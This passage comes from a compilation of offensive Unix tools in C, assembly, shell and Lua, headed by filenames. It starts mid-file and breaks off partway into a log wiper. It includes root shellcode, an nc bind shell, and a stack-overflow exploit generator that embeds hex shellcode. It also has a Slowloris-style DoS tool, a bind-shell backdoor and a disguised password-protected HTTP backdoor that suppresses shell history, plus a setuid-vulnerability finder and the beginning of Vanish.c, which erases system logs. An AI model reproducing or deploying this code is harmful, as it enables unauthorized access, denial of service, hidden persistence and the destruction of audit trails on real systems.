		exit(-1);
	}

	memcpy(ptr, shellcode, sizeof(shellcode)); 
	shellcodetotest = ptr;	
	shellcodetotest();	
	return 0;		
}

#------------------------------------------------------------------#
[ntcat.c]
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
int main()
{
	setresuid(0,0,0); 	/* Set res UID 0 0 0 to all program */
	char *envp[] = { NULL }; 
	char *argv[] = {&quot;/bin/nc&quot;, &quot;-lvp9999&quot;, &quot;-e/bin/sh&quot;, NULL};
	int ret = execve(&quot;/bin/nc&quot;, argv, envp); /* exec the command */
}

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[Setresuid.s]
;Taken from Hacking the Art of Exploitation 2nd 
;ASM Program to get setresuid shell
BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax		; zero out eax
  xor ebx, ebx		; zero out ebx
  xor ecx, ecx		; zero out ecx
  xor edx, edx		; zero out edx
  mov al,  0xa4		; 164 (0xa4) for syscall #164
  int 0x80		; setresuid(0, 0, 0) restore all root privs

; execve(const char *filename, char *const argv[], char *const envp[])
  xor eax, eax		; make sure eax is zeroed again	
  mov al,  11		; syscall #11
  push ecx		; push some nulls for string termination
  push 0x68732f2f	; push &quot;//sh&quot; to the stack
  push 0x6e69622f	; push &quot;/bin/&quot; to the stack
  mov ebx, esp		; put the address of &quot;/bin//sh&quot; into ebx, via esp
  push ecx		; push 32-bit null terminator for envp
  mov edx, esp		; this is an empty array for envp
  push ebx		; push string addr to stack above null terminator
  mov ecx, esp		; this is the argv array with string ptr
  int 0x80 		; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[Getevaddr.c]

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
        char *ptr;

        if(argc &lt; 2) {
                printf(&quot;Usage: %s &lt;environment variable&gt; \n&quot;, argv[0]);
                exit(0);
        }
        ptr = getenv(argv[1]); 
        printf(&quot;%s will be at %p\n&quot;, argv[1], ptr);
}


#------------------------------------------------------------------#

#------------------------------------------------------------------#
[0x333xes.c]
/*  0x333xes =&gt; stack overflow exploit generator
 *
 *  simple stack overflow exploit generator, that permits
 *  you to generate a -working- exploit source code. to make
 *  your exploit correctly works, &#039;xes&#039; try to automatically
 *  find the correct ret address
 *
 *  coded by c0wboy
 *
 *  ~ www.0x333.org ~
 */


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;getopt.h&gt;


#define VERSION       &quot;0.3&quot;

#define EXPLOIT       &quot;exploit.c&quot;
#define TEST          &quot;xes&quot;        /* file created with test shellcode */

#define XES_std       0xbffff300   /* address we start from to search for RET */
#define XES_env       0xbfffe0ff   /* that is not really true ... but by testing
                                    * i found some ENV located there ...
                                    */

#define MAX_LENGHT    10240  /* max buffer-lenght to exploit */
#define MAX_EVIL      1337   /* max ret-buffer lenght */
#define MAX           4      /* max shellcodes supported */

#define fatal(x...)   { fprintf (stderr, ##x); exit(-333); }
#define offset(x)     0xbfffffff - x


typedef struct { 
        char * sh_name;
        char * sh_type;
} sharkode;

sharkode shark[] = {

   {
      &quot; \&quot;touch xes\&quot; shellcode [-test only-]&quot;,
      &quot;unsigned char test[] =\n\t&quot;
      &quot;\&quot;\\xeb\\x30\\x5e\\x89\\x76\\x16\\x31\\xc0\\x88\&quot;\n\t&quot;
      &quot;\&quot;\\x46\\x08\\x88\\x46\\x0b\\x88\\x46\\x15\\x89\&quot;\n\t&quot;
      &quot;\&quot;\\x46\\x22\\xb0\\x0b\\x8d\\x5e\\x09\\x89\\x5e\&quot;\n\t&quot;
      &quot;\&quot;\\x1a\\x8d\\x5e\\x0c\\x89\\x5e\\x1e\\x89\\xf3\&quot;\n\t&quot;
      &quot;\&quot;\\x8d\\x4e\\x16\\x8d\\x56\\x22\\xcd\\x80\\x31\&quot;\n\t&quot;
      &quot;\&quot;\\xc0\\xb0\\x01\\xcd\\x80\\xe8\\xcb\\xff\\xff\&quot;\n\t&quot;
      &quot;\&quot;\\xff\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\&quot;\n\t&quot;
      &quot;\&quot;\\x20\\x2d\\x63\\x20\\x74\\x6f\\x75\\x63\\x68\&quot;\n\t&quot;
      &quot;\&quot;\\x20\\x78\\x65\\x73\&quot;;&quot;
   },

   {
      &quot; execve(/bin/sh); [linux]&quot;,
      &quot;unsigned char sharkode[] =\n\t&quot;
      &quot;\&quot;\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\&quot;\n\t&quot;
      &quot;\&quot;\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x99\\x52\\x53\&quot;\n\t&quot;
      &quot;\&quot;\\x89\\xe1\\xb0\\x0b\\xcd\\x80\&quot;;&quot;
   },

   {
      &quot; execve(/bin/sh); [*BSD]&quot;,
      &quot;unsigned char sharkode[] =\n\t&quot;
      &quot;\&quot;\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\&quot;\n\t&quot;
      &quot;\&quot;\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x54\\x53\&quot;\n\t&quot;
      &quot;\&quot;\\x50\\xb0\\x3b\\xcd\\x80\&quot;;&quot;
   },

   {
      &quot; setreuid(0,0)  shellcode&quot;,
      &quot;unsigned char sharkode[] =\n\t&quot;
      &quot;\&quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x46\\xcd\&quot;\n\t&quot;
      &quot;\&quot;\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\&quot;\n\t&quot;
      &quot;\&quot;\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x8d\\x54\&quot;\n\t&quot;
      &quot;\&quot;\\x24\\x08\\x50\\x53\\x8d\\x0c\\x24\\xb0\\x0b\&quot;\n\t&quot;
      &quot;\&quot;\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\&quot;;&quot;
   },

   { NULL, NULL },
};

int off = 0;

// prototypes
int main (int, char * []);
void usage (char *);
void shak_list (void);
unsigned long xes (int); /* find correct ret address */

void
usage (char * prg)
{
   fprintf (stderr, &quot;\n [~] 0x333xes =&gt; stack overflow exploit generator v%s [~]\n&quot;, VERSION);
   fprintf (stderr, &quot; [~]          coded by c0wboy ~ www.0x333.org          [~] \n\n&quot;);
   fprintf (stderr, &quot; Usage : %s [ -b binary ] [ -e environ ] [ -w switch ]&quot;, prg);
   fprintf (stderr, &quot; [ -s type ] [ -x ] [ -l lenght ] [ -o lenght ] [ -a align ] [ -h ]\n&quot;);
   fprintf (stderr, &quot;\n \t-b\tbugged binary\n&quot;);
   fprintf (stderr, &quot; \t-e\tset environ variable bugged\n&quot;);
   fprintf (stderr, &quot; \t-w\tset switch bugged\n&quot;);
   fprintf (stderr, &quot; \t-s\tshellcode type [0-%d]\n&quot;, MAX-1);
   fprintf (stderr, &quot; \t-x\tshellcode list\n&quot;);
   fprintf (stderr, &quot; \t-l\tbuffer lenght\n&quot;);
   fprintf (stderr, &quot; \t-o\tevil buffer (nop+shellcode) lenght (default 1337)\n&quot;);
   fprintf (stderr, &quot; \t-a\talign the buffer (try 1)\n&quot;);
   fprintf (stderr, &quot; \t-h\tdisplay this help\n\n&quot;);

   exit (-333);
}

void
shak_list (void)
{
   int list;
   fprintf (stdout, &quot;\n [~] Shellcode Types :\n&quot;);
   fprintf (stdout, &quot; --------------------- \n&quot;);      
   
   for (list = 0; shark[list].sh_name != NULL; ++list)
      fprintf (stdout, &quot; [%d] %s\n&quot;, list, shark[list].sh_name);
   fprintf (stdout, &quot;\n&quot;);
   
   exit (-333);
}

unsigned long
xes (int hard)
{
   int ret;
   char wuffer[33];
   unsigned long xes;
   FILE * cya, * fd;
   
   if (off)
      xes=XES_env;
   else
      xes=XES_std;

   for (ret=1 ; ret &lt; (offset(xes)) ; ret++, xes++)
   {
      bzero (wuffer, 33);
      sprintf (wuffer, &quot;./exploit 0x%x&quot;, xes);

      fprintf (stdout, &quot; * testing 0x%x\n&quot;, xes);
      if ((cya=popen (wuffer, &quot;r&quot;)) == NULL)
         fatal (&quot; [-] Error in testing exploit ...\n\n&quot;);
      
      if ((fd=fopen(TEST, &quot;r&quot;)))
      {
         pclose(cya);
         fclose(fd);
         return (xes+ 0xdf);
      }
      pclose(cya);
   }

   if(!hard)
      fprintf (stderr, &quot; [~] ret address NOT found ..\n [~] we suppose :\n\n&quot;
                       &quot;    [*] wrong buffer align\n [~] try to solve this problem ...\n&quot;);

   return (0x333);
}


int
main (int argc, char * argv[])
{
   int c, s=0, len=0, out=MAX_EVIL, step=0, align=0, hard=0;
   char exe[100], *bin=NULL, *w=NULL, *env=NULL;
   unsigned long ret_add;
   FILE * fd;

   while(( c = getopt (argc, argv, &quot;xhb:e:w:s:l:o:a:&quot;)) != EOF)
   {
      switch(c)
      {
         case &#039;b&#039; : bin = optarg; break;

         case &#039;e&#039; :
            env = optarg;
            off=1;
            break;

         case &#039;w&#039; : w = optarg; break;

         case &#039;s&#039; : /* shellcode types */
            s = atoi(optarg);
            if ((s&lt;0) || (s&gt;MAX-1))
               usage (argv[0]);
            break;

         case &#039;x&#039; : shak_list();

         case &#039;l&#039; :
            len = atoi(optarg);
            if (len&gt;MAX_LENGHT)
               fatal (&quot; [-] explotable-buffer is too long\n&quot;);
            break;

         case &#039;o&#039; :
            out = atoi(optarg); 
            if (out&gt;MAX_EVIL)
               fatal (&quot; [-] ret-buffer too long\n&quot;);
            break;

         case &#039;a&#039; : align = atoi(optarg); break;
         case &#039;h&#039; : usage(argv[0]);
         default  : usage(argv[0]);
      }
   }

   if ((!bin) || (!len) || ((env) &amp;&amp; (w)))
      usage(argv[0]);

   fprintf (stdout, &quot;\n [~] 0x333xes =&gt; stack flow exploit generator [~]\n&quot;);
   fprintf (stdout, &quot; [~]      coded by c0wboy ~ www.0x333.org     [~] \n\n&quot;);
   fprintf (stdout, &quot; [*] creating source code ...\n&quot;);


 do_sploit :   /* when ret is found, we re-write the exploit */

   system (&quot;rm -rf xes&quot;);
   
   if((fd = fopen (EXPLOIT, &quot;w&quot;)) == NULL)
      fatal (&quot; [-] Error in creating %s\n&quot;, EXPLOIT);

   fprintf (fd, &quot;/*  Generated with 0x333xes ~ coded by c0wboy\n *&quot;);
   fprintf (fd, &quot;\n *  ~ www.0x333.org ~\n *\n */ &quot;);

   /* setting header */
   fprintf (fd, &quot;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n&quot;);
   fprintf (fd, &quot;#include &lt;string.h&gt;\n\n#define BIN\t\&quot;%s\&quot;\n#define NOP\t0x90\n&quot;, bin);
   fprintf (fd, &quot;#define BUFFER\t%i\n&quot;, len);

   if (!env)
      fprintf (fd, &quot;#define OUTSIDE\t%i\n&quot;, out);

   if (hard)
      align = 1;

   if (!align)
      fprintf (fd, &quot;#define ALIGN\t0\n&quot;);
   else
      fprintf (fd, &quot;#define ALIGN\t%d\n&quot;, align);

   if (step)
      fprintf (fd, &quot;#define RET\t0x%x\n&quot;, ret_add);

   /* setting shellcode */
   if (step)
      fprintf (fd, &quot;\n\n%s\n&quot;, shark[s].sh_type);
   else
      fprintf (fd, &quot;\n\n%s\n&quot;, shark[0].sh_type); /* test-shellcode */

   /* setting main() */
   if (step)
      fprintf (fd, &quot;int\nmain ()\n&quot;);
   else
      fprintf (fd, &quot;int\nmain (int argc, char * argv[])\n&quot;);

   if (env)
      fprintf (fd, &quot;{\n   int x;\n   char buf[BUFFER], *bufz;\n&quot;);
   else
      fprintf (fd, &quot;{\n   int x;\n   char buf[BUFFER], out[OUTSIDE], *bufz;\n&quot;);

   if (step)
      fprintf (fd, &quot;   unsigned long ret_add = RET, *add_ptr ;\n\n&quot;);
   else
      fprintf (fd, &quot;   unsigned long ret_add, *add_ptr ;\n\n&quot;
                   &quot;   if (argc != 2)\n      exit (-333);\n\n&quot;
                   &quot;   ret_add = strtoul (argv[1], &amp;argv[1], 16);\n\n&quot;);

   fprintf (fd, &quot;   bufz = buf + ALIGN;\n   add_ptr = (long *)bufz;\n\n&quot;
                &quot;   for (x=0; x&lt;BUFFER-1; x+=4)\n&quot;
                &quot;      *(add_ptr++)=ret_add;\n\n&quot;);

   if (env)
   {
      if (step)
      {
         fprintf (fd, &quot;   /* nop + shellcode */\n   memset ((char *)buf, NOP, 333 + &quot;
                      &quot;strlen (sharkode));\n   memcpy ((char *)buf+333, sharkode, &quot;
                      &quot;strlen (sharkode));\n\n&quot;);
      }
      else
      {
         fprintf (fd, &quot;   /* nop + shellcode */\n   memset ((char *)buf, NOP, 333 + &quot;
                      &quot;strlen (test));\n   memcpy ((char *)buf+333, test, strlen &quot;
                      &quot;(test));\n\n&quot;);
      }
   }
   else /* standard exploiting */
   {
      fprintf (fd, &quot;   /* nop + shellcode */\n   memset ((char *)out, NOP, OUTSIDE);\n&quot;);

      if (step)
         fprintf (fd, &quot;   memcpy ((char *)out + 333, sharkode, strlen(sharkode));\n\n&quot;);
      else 
         fprintf (fd, &quot;   memcpy ((char *)out + 333, test, strlen(test));\n\n&quot;);

      fprintf (fd, &quot;   memcpy((char *)out, \&quot;OUT=\&quot;, 4);\n   putenv(out);\n\n&quot;);
   }

   /* environment bugged ? */
   if (env)
   {
      if(step)
         fprintf (fd, &quot;\n&quot;);
      
      fprintf (fd, &quot;   setenv (\&quot;%s\&quot;, buf, 333);\n&quot;, env);
   }

   if (step)
      fprintf (fd, &quot;\n   fprintf (stdout, \&quot; Local exploit for %s\&quot;);\n&quot;, bin);
   
   /* switch ? */
   if (w)
      fprintf (fd, &quot;   execl (BIN, BIN, \&quot;%s\&quot;, buf, NULL);\n&quot;, w);
   else
   {
      if (env)
         fprintf (fd, &quot;   execl (BIN, BIN, NULL);\n&quot;);
      else
         fprintf (fd, &quot;   execl (BIN, BIN, buf, NULL);\n&quot;);
   }

   fprintf (fd, &quot;\n   return 0;\n}\n\n&quot;);
   fclose (fd);

   /* compile &amp; test exploit */
   if (!step)
   {
      sprintf (exe, &quot;gcc %s -o exploit&quot;, EXPLOIT);
      system (exe);
  
      fprintf (stdout, &quot; [*] exploit created\n&quot;);
      fprintf (stdout, &quot; [*] now find correct ret add\n&quot;);

      if (( ret_add = xes (hard) ) == 0x333)
      {
         if (hard)
         {
            fprintf (fd, &quot; [-] exploit doesn&#039;t work ...\n&quot;
                         &quot;    [**] maybe binary has not -stack- overflow problem [**]\n&quot;
                         &quot; [-] other problems can be detected by reading source code ...\n&quot;
                         &quot; [-] sorry\n&quot;);
           exit (-333);
         }
         else
            hard=1;

         goto do_sploit;
      }
      else
      {
         step=1;
         goto do_sploit;
      }
   }

   system (&quot;rm -rf exploit xes&quot;);
   fprintf (stdout, &quot;\n [*] your working exploit for %s is ready !\n\n&quot;, bin);
   return 0;
}


#------------------------------------------------------------------#

#------------------------------------------------------------------#
[findvuln.sh]
#Find setuid programs
#!/bin/sh
tempfile=&quot;/tmp/$0.$$&quot;
trap &quot;rm $tempfile&quot; 0
find / \( -type f -a -user root -a -perm -4001 \) -print &gt; $tempfile
for file in `cat $tempfile`; do
strings -a $file | awk &#039;/^gets$|^strcpy$|^strcat$|^sprintf$/\
{ printf (&quot;%-10s \t %-50s \n&quot;), $1, file }&#039; &quot;file=$file&quot; -
done

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[xerxes.c]
/* DoS tool to take down website made by Jester */
 
 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
 
 
int make_socket(char *host, char *port) {
 struct addrinfo hints, *servinfo, *p;
 int sock, r;
// fprintf(stderr, &quot;[Connecting -&gt; %s:%s\n&quot;, host, port);
 memset(&amp;hints, 0, sizeof(hints));
 hints.ai_family = AF_UNSPEC;
 hints.ai_socktype = SOCK_STREAM;
 if((r=getaddrinfo(host, port, &amp;hints, &amp;servinfo))!=0) {
  fprintf(stderr, &quot;getaddrinfo: %s\n&quot;, gai_strerror(r));
  exit(0);
 }
 for(p = servinfo; p != NULL; p = p-&gt;ai_next) {
  if((sock = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol)) == -1) {
   continue;
  }
  if(connect(sock, p-&gt;ai_addr, p-&gt;ai_addrlen)==-1) {
   close(sock);
   continue;
  }
  break;
 }
 if(p == NULL) {
  if(servinfo)
   freeaddrinfo(servinfo);
  fprintf(stderr, &quot;No connection could be made\n&quot;);
  exit(0);
 }
 if(servinfo)
  freeaddrinfo(servinfo);
 fprintf(stderr, &quot;[Connected -&gt; %s:%s]\n&quot;, host, port);
 return sock;
}
 
 
void broke(int s) {
 // do nothing
}
 
 
#define CONNECTIONS 8
#define THREADS 48
 
 
void attack(char *host, char *port, int id) {
 int sockets[CONNECTIONS];
 int x, g=1, r;
 for(x=0; x!= CONNECTIONS; x++)
  sockets[x]=0;
 signal(SIGPIPE, &amp;broke);
 while(1) {
  for(x=0; x != CONNECTIONS; x++) {
   if(sockets[x] == 0)
    sockets[x] = make_socket(host, port);
   r=write(sockets[x], &quot;\0&quot;, 1);
   if(r == -1) {
    close(sockets[x]);
    sockets[x] = make_socket(host, port);
   } else
//    fprintf(stderr, &quot;Socket[%i-&gt;%i] -&gt; %i\n&quot;, x, sockets[x], r);
   fprintf(stderr, &quot;[%i: Voly Sent]\n&quot;, id);
  }
  fprintf(stderr, &quot;[%i: Voly Sent]\n&quot;, id);
  usleep(300000);
 }
}
 
 
void cycle_identity() {
 int r;
 int socket = make_socket(&quot;localhost&quot;, &quot;9050&quot;);
 write(socket, &quot;AUTHENTICATE \&quot;\&quot;\n&quot;, 16);
 while(1) {
  r=write(socket, &quot;signal NEWNYM\n\x00&quot;, 16);
  fprintf(stderr, &quot;[%i: cycle_identity -&gt; signal NEWNYM\n&quot;, r);
  usleep(300000);
 }
}
 
 
int main(int argc, char **argv) {
 int x;
 if(argc !=3)
  cycle_identity();
 for(x=0; x != THREADS; x++) {
  if(fork())
   attack(argv[1], argv[2], x);
  usleep(200000);
 }
 getc(stdin);
 return 0;
}


#------------------------------------------------------------------#

#------------------------------------------------------------------#
[Blackhole.c]
/* Edited and fixed by me */
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#define SH &quot;/bin/sh&quot;
#define LISTN 1

int main(int argc, char **argv)
{

char *fst = &quot;\nConnected!\n\n&quot;;
char *sec = &quot;Blackhole edited and fixed By MIND Z SEC(flor_iano@hotmail.com)\n&quot;;
char *thr = &quot;If this is telnet enter ; for every command\n\n&quot;;

int outsock, insock, sz;
struct sockaddr_in home;
struct sockaddr_in away;
home.sin_family=AF_INET;
int P;
printf(&quot;\nEnter your desired port to listen :: &quot;);
scanf(&quot;%d&quot;, &amp;P);
printf(&quot;\nNow connect to this machine with nc or telnet \n&quot;);
printf(&quot;\nFor nc-&gt;nc IP %d\n&quot;, P);
printf(&quot;\nFor telnet-&gt;telnet IP %d\n\n&quot;, P);
home.sin_port=htons(P);
home.sin_addr.s_addr=INADDR_ANY;
bzero(&amp;(home.sin_zero),8);

if((outsock=socket(AF_INET,SOCK_STREAM,0))&lt;0)
  exit(printf(&quot;\nSocket error\n&quot;));

if((bind(outsock,(struct sockaddr *)&amp;home,sizeof(home))&lt;0))
  exit(printf(&quot;\nBind error\n&quot;));

if((listen(outsock,LISTN))&lt;0)
  exit(printf(&quot;\nListen error\n&quot;));

sz=sizeof(struct sockaddr_in);
for(;;)
  {
  if((insock=accept(outsock,(struct sockaddr *)&amp;away, &amp;sz))&lt;0)
    exit(printf(&quot;\nAccept error&quot;));
  if(fork() !=0)
    {
    send(insock,fst,strlen(fst),0); 
    send(insock,sec,strlen(sec),0);
    send(insock,thr,strlen(thr),0);
    dup2(insock,0);
    dup2(insock,1);
    dup2(insock,2);
    execl(SH,SH,(char *)0);
    close(insock);
    exit(0); 
    }
  close(insock);
  }
}


#------------------------------------------------------------------#

#------------------------------------------------------------------#

[getpwd.c]
/* Crawl the /etc/passwd file */
#include &lt;pwd.h&gt; 
int main()
{
struct passwd *p; 
while(
p=getpwent())
printf(&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;, p-&gt;pw_name,p-&gt;pw_passwd,
p-&gt;pw_uid, p-&gt;pw_gid, p-&gt;pw_gecos, p-&gt;pw_dir, p-&gt;pw_shell);
}


#------------------------------------------------------------------#

#------------------------------------------------------------------#
[exploitdb.nse]
description = [[Searches for exploits in the exploitdb on Backtrack. 
This archive can also be found at http://www.exploitdb.com]]
author = &quot;L10n&quot;
license = &quot;Same as Nmap--See http://nmap.org/book/man-legal.html&quot;
categories = {&quot;safe&quot;, &quot;vuln&quot;}

require(&quot;stdnse&quot;)

portrule = function(host, port)
    return port.state == &quot;open&quot;
end

action = function(host, port)
    local n = port.version.product
    local exploits = &quot;&quot;
    for line in io.lines (&quot;/pentest/exploits/exploitdb/files.csv&quot;) do
         if string.match(line, n) and string.match(line, &quot;remote&quot;) then
             local items = split(line, &quot;,&quot;)
             local file  = items[2]
             local desc  = items[3]
             exploits    = exploits..file..&quot; ---&gt; &quot;..desc..&quot;\n&quot;
         end
    end
    if not string.match(exploits, &quot;\n&quot;) then
        exploits = nil
    end
    exploits = &quot; \n&quot;..exploits
    return exploits
end

function split(str, pat)
    local t = {}  -- NOTE: use {n = 0} in Lua-5.0
    local fpat = &quot;(.-)&quot; .. pat
    local last_end = 1
    local s, e, cap = str:find(fpat, 1)
    while s do
        if s ~= 1 or cap ~= &quot;&quot; then
	    table.insert(t,cap)
        end
        last_end = e+1
        s, e, cap = str:find(fpat, last_end)
    end
    if last_end &lt;= #str then
        cap = str:sub(last_end)
        table.insert(t, cap)
    end
    return t
end

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[ASMSHELL by izik.s]
.globl _start
_start:
   # our setreuid(0,0) call
   xor %eax, %eax    # clear out eax
   movb $70, %al     # mov 70 int al
   xor %ecx, %ecx    # set ecx to 0, which is the uid_t euid (effective userid)
   xor %ebx, %ebx    # set ebx to 0, which is the uid_t ruid (real userid)
   int $0x80         # call kernel
   # go get the address with the call trick
   jmp do_call
jmp_back:
   pop %ebx            # ebx has the address of our string, use it to index
   xor %eax, %eax      # set eax to 0
   movb %al, 7(%ebx)   # put a null at the N aka shell[7]
   movl %ebx, 8(%ebx)  # put the address of our string (in ebx) into shell[8]
   movl %eax, 12(%ebx) # put the null at shell[12]
   # our string now looks like &quot;/bin/sh\0(*ebx)(*0000)&quot; which is what we want.
   xor %eax, %eax      # clear out eax
   movb $11, %al       # put 11 which is execve syscall number into al
   leal 8(%ebx), %ecx  # put the address of XXXX aka (*ebx) into ecx
   leal 12(%ebx), %edx # put the address of YYYY aka (*0000) into edx
   int $0x80           # call kernel
do_call:
   call jmp_back
shell:
   .ascii &quot;/bin/shNXXXXYYYY&quot;
#------------------------------------------------------------------#

#------------------------------------------------------------------#
[HTTP Backdoor.c]
/* Old style backdoor but useful */
/*
 * Generic backdoor. (ab)use for your own fun and profit.. but behave..
 *
 * C.P. (fygrave@tigerteam.net)
 * Nov 12 10:12:09 KGT 1998. Went public 1999.
 */
#define _XOPEN_SOURCE
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;signal.h&gt;
#include &lt;string.h&gt;

#define DEFAULT_PORT 8080
/* des crypted password */
#define PWD &quot;QXtGlGiFUEeKY&quot;

void sig_hand(int sig) {
        int status;
                /* rip off children */
        while(waitpid(-1,&amp;status,WNOHANG)&gt;0);

}

/* we hide ourselves as httpd daemon */
char *erro=
&quot;HTTP/1.1 404 Not Found\n&quot;
&quot;Date: Mon, 08 Dec 1998 23:17:15 GMT\n&quot;
&quot;Server: Apache/1.3.X (Unix)\n&quot;
&quot;Connection: close\n&quot;
&quot;Content-Type: text/html\n\n&quot;
&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//IETF//DTD HTML 2.0//EN\&quot;&gt;\n&quot;
&quot;&lt;HTML&gt;&lt;HEAD&gt;\n&quot;
&quot;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;\n&quot;
&quot;&lt;/HEAD&gt;&lt;BODY&gt;\n&quot;
&quot;&lt;H1&gt;Not Found&lt;/H1&gt;\n&quot;
&quot;The requested URL /loha was not found on this server.&lt;P&gt;\n&quot;
&quot;&lt;HR&gt;\n&quot;
&quot;&lt;ADDRESS&gt;Apache/1.3.X Server at yourserver Port 80&lt;/ADDRESS&gt;\n&quot;
&quot;&lt;/BODY&gt;&lt;/HTML&gt;\n&quot;;

void my_error(int fd) {
        write(fd,erro,strlen(erro));
}

int main(int argc,char **argv)
{
        char *name[3];
	char *env[2];
	char *execname;
        int fd,fd2,fromlen;
        int port;
        struct sockaddr_in serv;
        char *crypted=PWD;
        unsigned char *ptr;
        char pass[9];

        port=DEFAULT_PORT;
        if (argc&gt;1 &amp;&amp; atoi(argv[1])) port=atoi(argv[1]);
#ifndef DEBUG
        if (fork()) exit(1);
        close(0);
        close(1);
        close(2);
        chdir(&quot;/&quot;);
        setsid();
#endif
        signal(SIGCHLD,sig_hand);
        
        if((fd=socket(AF_INET,SOCK_STREAM,0))&lt;0) {
#ifdef DEBUG
                perror(&quot;socket&quot;);
#endif
                exit(1);
        }
        serv.sin_addr.s_addr=0;
        serv.sin_port=htons(port);
        serv.sin_family=AF_INET;

        if(bind(fd,(struct sockaddr *)&amp;serv,16)) {
#ifdef DEBUG
                perror(&quot;bind&quot;);
#endif
                exit(1);
        }

        if(listen(fd,5)) {
#ifdef DEBUG
                perror(&quot;listen&quot;);
                exit(1);
#endif
        }

        for(;;) {
                fromlen=16; /*(sizeof(struct sockaddr)*/
                fd2=accept(fd,(struct sockaddr *)&amp;serv,&amp;fromlen);
                if (fd2&lt;0) continue;

                if (fork()) { /* parent */
                             close(fd2);
                } else {
                        close(fd);
                        bzero(pass,9);
                        read(fd2,pass,8);
                        for(ptr=pass;*ptr!=0;ptr++)
                                if(*ptr&lt;32) *ptr=0;
                        if (strcmp(crypt(pass,crypted),crypted)) {
                                my_error(fd2);
                                exit(1);
                        }
                        dup2(fd2,0);
                        dup2(fd2,1);
                        dup2(fd2,2);
                        execname=&quot;/bin/sh&quot;;
                        name[0]=&quot;/sbin/klogd&quot;;
                        /* gives somewhat nicer appearence */
                        name[1]=&quot;-i&quot;;
                        name[2]=NULL;
                        /* if the actual /bin/sh is bash
                         * we need this to get rid saving stuff into
                         * .bash_history file
                         */
                        env[0]=&quot;HISTFILE=/dev/null&quot;;
                        env[1]=NULL;
                        execve(name[0],name,env);
                        exit(1);
                }
        }
}


#------------------------------------------------------------------#

#------------------------------------------------------------------#
[Vanish.c]
/* Leave no logs */
/***************************************************************************
                          vanish.c  -  description                           
                            -------------------                           
                  begin                : Wed Feb 2 2000                       
                  copyright            : (C) 2000 by Neo the Hacker     
                  email                : --------------------------     
                             
***************************************************************************/

/***************************************************************************
* Vanish.c cleans WTMP, UTMP, lastlog, messages, secure, xferlog, maillog, *
* warn, mail, httpd.access_log, httpd.error_log. Use your brain, check your*
* logs and edit accordingly !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*
****************************************************************************
* Warning!! This programm is for educational purpouse only! I am not       *
* responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*
****************************************************************************
* Code written for Unix like systems! Tested on SuSE-Linux 6.2 !           *
* Compile like: gcc vanish.c -o vanish                                     *
***************************************************************************/


#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;		
#include &lt;utmp.h&gt;		
#include &lt;sys/types.h&gt;		
#include &lt;unistd.h&gt;
#include &lt;lastlog.h&gt;
#include &lt;pwd.h&gt;

#define UTMP            &quot;/var/run/utmp&quot;
#define WTMP            &quot;/var/log/wtmp&quot;
#define LASTLOG         &quot;/var/log/lastlog&quot;
#define MESSAGES        &quot;/var/log/messages&quot;
#define SECURE          &quot;/var/log/secure&quot;
#define XFERLOG         &quot;/var/log/xferlog&quot;
#define MAILLOG         &quot;/var/log/maillog&quot;     
#define WARN            &quot;/var/log/warn&quot;
#define MAIL            &quot;/var/log/mail&quot;
#define HTTPDA          &quot;/var/log/httpd.access_log&quot;
#define HTTPDE          &quot;/var/log/httpd.error_log&quot;
#define MAXBUFF		8*1024



int main(int argc, char *argv[])
{
struct utmp ut ;		
struct lastlog ll ;		
struct passwd *pass ;
int i, size, fin, fout ;
FILE *pfile;
FILE *pfile2;
char *varlogs[] = {MESSAGES, SECURE, XFERLOG, MAILLOG, WARN, MAIL, HTTPDA,HTTPDE} ; 
char *newlogs[] = {&quot;messages.hm&quot;, &quot;secure.hm&quot;,&quot;xferlog.hm&quot;,&quot;maillog.hm&quot;,&quot;warn.hm&quot;, 
&quot;mail.hm&quot;, &quot;httpda.hm&quot;, &quot;httpde.hm&quot;} ;  
char buffer[MAXBUFF] ;

char user[10] ;		
char host[100] ;		
char host_ip[17] ;


/*Usage of the programm*/
